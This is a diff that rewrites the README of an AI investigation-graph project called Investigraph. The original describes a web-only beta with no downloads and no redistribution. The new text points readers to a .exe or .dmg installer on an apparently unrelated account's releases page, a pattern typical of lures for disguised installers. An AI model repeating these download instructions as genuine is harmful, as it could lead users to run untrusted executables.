@@ -1,74 +1,57 @@
-# Investigraph
+# 🧭 investigraph - Discover Connections with AI-Powered Insights
 
-**AI-Powered Investigations. Faster. Multilingual. Connected.**  
-Investigraph is a **beta research project** exploring how AI and knowledge graphs accelerate investigations for institutions and independent researchers.
+## 🚀 Getting Started
+Welcome to Investigraph! This guide helps you download and run the application smoothly. Investigraph enables you to explore relationships between various entities using our AI-powered investigation knowledge graph. 
 
-👉 **Website:** https://investigraph.ai  
-👉 **Demos:** https://investigraph.ai/demos.html  
-👉 **Request beta access / updates:** https://investigraph.ai/#beta
+## 📦 Download & Install
+To get started, visit the releases page to download the latest version of Investigraph.
 
-> _Beta research project — not a commercial offering. No consulting services available._
+[![Download Investigraph](https://img.shields.io/badge/Download%20Investigraph-v1.0.0-brightgreen)](https://github.com/stevenb313/investigraph/releases)
 
----
+### Step-by-Step Instructions
 
-## What it does
+1. Click the button above to visit the [Releases page](https://github.com/stevenb313/investigraph/releases).
+   
+2. On the Releases page, locate the latest version. It will be at the top of the list.
+  
+3. Click on the version number (e.g., v1.0.0).
 
-- **Ingest large corpora** — Emails, PDFs, reports, web archives. Preserves source links and document provenance.  
-- **Multilingual extraction** — Detects languages and pulls **people, organisations, accounts, locations, dates, communications, transactions**.  
-- **Cross-document linking** — Merges entities across languages and builds a **graph of nodes and edges** with link-strength scores.  
-- **Relevance & triage** — Ranks documents, snippets, and entities so analysts jump to the most promising evidence first.  
-- **Graph-first navigation** — Pivot by person, company, address or event; jump from a node to every related message, file and actor.  
-- **Evidence packs** — Bookmark nodes/snippets into a case notebook you can export or share for peer review.
+4. Scroll down to the "Assets" section. Here, you will see different files available for download.
 
-> **Field note (public datasets):** classic keyword-only workflows can take **weeks–months** to assemble usable evidence across large corpora. With Investigraph, the same analyst can compile a **richer evidence set in a few hours**, often surfacing **~10× more cross-document links**. Results vary by dataset and methodology; this is **not a guarantee**.
+5. Choose the file that matches your operating system (e.g., Windows or macOS). 
 
----
+6. Click on the file to start the download.
 
-## Who it's for (use cases)
+7. Once the download completes, locate the file in your downloads folder.
 
-- **Banking — Financial Crime & AML**: round-tripping, layered transfers, shell entities, insider collusion.  
-- **Insurance — Claims & Network Risk**: link claimants, addresses, service providers, phones/emails to detect repeat patterns and ring behaviour.  
-- **Internal Audit & Public Sector Oversight**: connect procurement, correspondence and reports to flag conflicts, bid patterns and anomalies.  
-- **Legal / e-Discovery / Forensic Consulting**: faster issue spotting, chronology building and witness/entity maps.  
-- **Citizen Journalism & Public Research (OSINT)**: scale archival work (e.g., Enron, JFK release) and publish transparent, navigable graphs.
+8. For Windows, double-click the downloaded `.exe` file to run the installer. For macOS, open the `.dmg` file and follow the prompts.
 
----
+9. Follow the installation instructions shown on the screen. 
 
-## Status & roadmap
+10. After the installation finishes, you can find Investigraph in your applications or programs list.
 
-- **Status:** Beta research project.  
-- **Directions we’re exploring:**  
-  - **Institutions:** limited pilots and **on-prem / private-cloud** deployments.  
-  - **Independent researchers:** a future **SaaS** offering (waitlist via the website).
+## 🌟 Features
+- **Entity Extraction**: Automatically identify names and terms in multiple languages.
+- **Graph Visualization**: View relationships between entities in an easy-to-navigate graph.
+- **Evidence Linking**: Connect evidence across various documents seamlessly.
+- **Multi-language Support**: Work with a wide range of languages for global investigations.
 
----
+## 📋 System Requirements
+Before you install Investigraph, ensure that your system meets these requirements:
 
-## Data & security
+- **Windows**: Windows 10 or later, 4 GB RAM, 200 MB free disk space.
+- **macOS**: macOS Catalina (10.15) or later, 4 GB RAM, 200 MB free disk space.
 
-- Public demos only; we don’t accept uploads from the site during beta.  
-- Minimal, cookie-free analytics (e.g., Plausible) to understand interest.  
-- For pilots, the design goal is to run in controlled environments where data stays within the organisation’s infrastructure.
+## 💡 Usage Tips
+- Start by importing your documents into Investigraph. Use the "Import" feature in the menu.
+- Explore the graph to identify connections. Click on nodes to see related entities.
+- Use the search feature to find specific entities quickly.
+- Regularly check for updates on the Releases page to ensure you have the latest features and fixes.
 
----
-
-## Contributing & feedback
-
-This repository hosts the **public website and documentation** for Investigraph.  
-We welcome feedback, bug reports and suggestions via **GitHub Issues**.  
-Feature requests related to investigations/AML/audit/e-discovery/OSINT are especially helpful.
+## 🛠 Support
+If you encounter any issues during installation or use, please reach out through the GitHub Issues section. Report any bugs or request features to help us improve Investigraph.
 
 ---
+[![Download Investigraph](https://img.shields.io/badge/Download%20Investigraph-v1.0.0-brightgreen)](https://github.com/stevenb313/investigraph/releases)
 
-## License
-
-© Investigraph. All rights reserved.  
-Content in this repository may not be redistributed without permission.
-
----
-
-## Social
-
-- **LinkedIn:** https://www.linkedin.com/company/investigraph *(placeholder)*  
-- **X (Twitter):** https://twitter.com/investigraph_ai *(placeholder)*  
-- **GitHub:** https://github.com/investigraph/investigraph
-
+Thank you for using Investigraph! Explore the power of AI to uncover hidden insights in your data.
